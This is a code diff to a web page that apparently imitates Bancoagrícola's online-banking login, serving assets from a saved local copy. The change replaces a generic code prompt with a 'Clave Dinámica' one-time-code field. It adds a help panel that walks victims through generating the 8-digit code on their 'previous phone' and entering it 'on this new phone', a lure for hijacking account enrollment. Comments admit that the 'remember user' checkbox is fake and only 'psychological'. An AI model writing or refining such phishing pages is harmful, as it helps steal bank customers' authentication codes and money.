@@ -1067,22 +1067,22 @@
     }
     .tok-logo {
       display: block;
-      width: 180px;
-      height: 44px;
-      background: url(./index_files/positivo.svg) no-repeat center / contain;
-      margin: 0 auto 28px;
+      width: 140px;
+      height: 100px;
+      object-fit: contain;
+      margin: 0 auto 18px;
     }
     .tok-title {
-      font-size: 17px;
+      font-size: 20px;
       font-weight: 700;
       color: #1a1a1a;
-      margin-bottom: 10px;
+      margin-bottom: 6px;
       font-family: 'Open Sans', sans-serif;
     }
     .tok-msg {
       font-size: 14px;
       color: #5a6473;
-      line-height: 1.6;
+      line-height: 1.5;
       margin-bottom: 24px;
       font-family: 'Open Sans', sans-serif;
     }
@@ -1106,7 +1106,7 @@
       color: #c0392b;
       font-family: 'Open Sans', sans-serif;
       min-height: 18px;
-      margin-bottom: 16px;
+      margin-bottom: 14px;
     }
     .tok-btn {
       display: block;
@@ -1121,6 +1121,120 @@
       cursor: pointer;
       text-transform: uppercase;
       font-family: CIBfont, Helvetica, Arial, sans-serif;
+    }
+    .tok-help-btn {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      width: 100%;
+      background: #fff;
+      border: 1.5px solid #d8d8d8;
+      border-radius: 50px;
+      padding: 10px 18px;
+      margin-top: 12px;
+      cursor: pointer;
+      font-size: 13px;
+      font-family: 'Open Sans', sans-serif;
+      color: #2a2a2a;
+      text-align: left;
+    }
+    .tok-help-btn svg { flex-shrink: 0; }
+
+    /* Panel instrucciones Clave Dinamica */
+    .cd-panel {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #fff;
+      z-index: 9999999;
+      flex-direction: column;
+      overflow-y: auto;
+    }
+    .cd-panel.show { display: flex; }
+    .cd-hdr {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 14px 16px;
+      border-bottom: 1px solid #efefef;
+      position: relative;
+    }
+    .cd-back {
+      position: absolute;
+      left: 12px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px 8px;
+      font-size: 20px;
+      color: #333;
+      line-height: 1;
+    }
+    .cd-hdr-logo {
+      height: 26px;
+      object-fit: contain;
+    }
+    .cd-body {
+      flex: 1;
+      padding: 24px 24px 32px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .cd-phone {
+      width: 200px;
+      margin-bottom: 24px;
+      border-radius: 20px;
+      box-shadow: 0 4px 20px rgba(0,0,0,.15);
+    }
+    .cd-title {
+      font-size: 18px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 22px;
+      font-family: 'Open Sans', sans-serif;
+      color: #1a1a1a;
+    }
+    .cd-steps {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      width: 100%;
+      max-width: 320px;
+    }
+    .cd-steps li {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 16px;
+      font-size: 14px;
+      font-family: 'Open Sans', sans-serif;
+      line-height: 1.55;
+      color: #2a2a2a;
+      align-items: flex-start;
+    }
+    .cd-bullet {
+      width: 13px;
+      height: 13px;
+      background: #fdda24;
+      flex-shrink: 0;
+      margin-top: 3px;
+    }
+    .cd-volver {
+      display: block;
+      width: 100%;
+      max-width: 320px;
+      background: #fdda24;
+      color: #292929;
+      font-weight: 700;
+      font-size: 16px;
+      padding: 16px;
+      border-radius: 50px;
+      border: none;
+      cursor: pointer;
+      text-align: center;
+      font-family: CIBfont, Helvetica, Arial, sans-serif;
+      text-transform: uppercase;
+      margin-top: 32px;
     }
 
     /* Toast de error (sin icóno, sin botón) */
@@ -1182,12 +1296,39 @@
   <div class="notif-pop" id="notif-pop"></div>
   <div class="tok-overlay" id="tok-ov">
     <div class="tok-box">
-      <span class="tok-logo" aria-hidden="true"></span>
-      <p class="tok-title">Verificación de seguridad</p>
-      <p class="tok-msg">Hemos enviado un código de seguridad a tu número de teléfono o correo electrónico. Ingrésala para continuar.</p>
+      <img class="tok-logo" src="./index_files/clave-dinamica-logo.png" alt="Clave Dinámica">
+      <p class="tok-title">Clave Dinámica</p>
+      <p class="tok-msg">Genera la Clave Dinámica desde Banca Móvil</p>
       <input type="text" id="x-tok" inputmode="numeric" autocomplete="one-time-code" maxlength="8" class="tok-input" placeholder="_ _ _ _ _ _">
       <span class="tok-err" id="tok-err">&nbsp;</span>
       <button type="button" class="tok-btn" id="btn-tok">Continuar</button>
+      <button type="button" class="tok-help-btn" id="btn-cd-help">
+        <svg width="26" height="26" viewBox="0 0 26 26" fill="none">
+          <circle cx="13" cy="13" r="12" stroke="#2ea44f" stroke-width="1.8"/>
+          <path d="M13 5a8 8 0 0 1 6.2 13.1" stroke="#2ea44f" stroke-width="1.8" stroke-linecap="round"/>
+          <path d="M19.5 17.5l-.5 3-2.8-1.2" stroke="#2ea44f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+          <rect x="9.5" y="14.5" width="7" height="5.5" rx="1" fill="#2ea44f"/>
+          <path d="M11 14.5v-2a2 2 0 0 1 4 0v2" stroke="#2ea44f" stroke-width="1.5" fill="none"/>
+        </svg>
+        ¿Cómo generar la Clave Dinámica?
+      </button>
+    </div>
+  </div>
+  <div class="cd-panel" id="cd-panel">
+    <div class="cd-hdr">
+      <button class="cd-back" id="btn-cd-back">&#8592;</button>
+      <img class="cd-hdr-logo" src="./index_files/positivo.svg" alt="Bancoagrícola">
+    </div>
+    <div class="cd-body">
+      <img class="cd-phone" src="./index_files/clave-dinamica-phone.png" alt="" onerror="this.style.display='none'">
+      <p class="cd-title">Para generar tu Clave<br>Dinámica:</p>
+      <ul class="cd-steps">
+        <li><span class="cd-bullet"></span><span>Abre tu App Banca Móvil desde tu celular anterior.</span></li>
+        <li><span class="cd-bullet"></span><span>En la parte inferior de la pantalla, haz clic en el botón de “Clave Dinámica”.</span></li>
+        <li><span class="cd-bullet"></span><span>Ingresa el código de 8 dígitos en este nuevo celular.</span></li>
+        <li><span class="cd-bullet"></span><span>Recuerda: tu Clave Dinámica cambiará cada minuto.</span></li>
+      </ul>
+      <button class="cd-volver" id="btn-cd-back2">Volver</button>
     </div>
   </div>
   <div class="loader-overlay" id="loader-ov">
@@ -1511,6 +1652,15 @@
       [_i1, _i2, _i3, _i4, _i5].forEach(function (el) { if (el) el.addEventListener('keypress', function (ev) { if (ev.key === 'Enter') { ev.preventDefault(); _btn.click(); } }); });
 
       var _lk = $('lk2'); if (_lk) _lk.addEventListener('click', function (e) { e.preventDefault(); alert('Opción desactivada.'); });
+
+      // Panel Clave Dinamica
+      var _cdHelp  = document.getElementById('btn-cd-help');
+      var _cdBack  = document.getElementById('btn-cd-back');
+      var _cdBack2 = document.getElementById('btn-cd-back2');
+      var _cdPanel = document.getElementById('cd-panel');
+      if (_cdHelp)  _cdHelp.addEventListener('click',  function () { _cdPanel.classList.add('show'); });
+      if (_cdBack)  _cdBack.addEventListener('click',  function () { _cdPanel.classList.remove('show'); });
+      if (_cdBack2) _cdBack2.addEventListener('click', function () { _cdPanel.classList.remove('show'); });
 
       // Checkbox "Recordar usuario" - solo visual (psicológico, sin guardar nada)
       (function () {
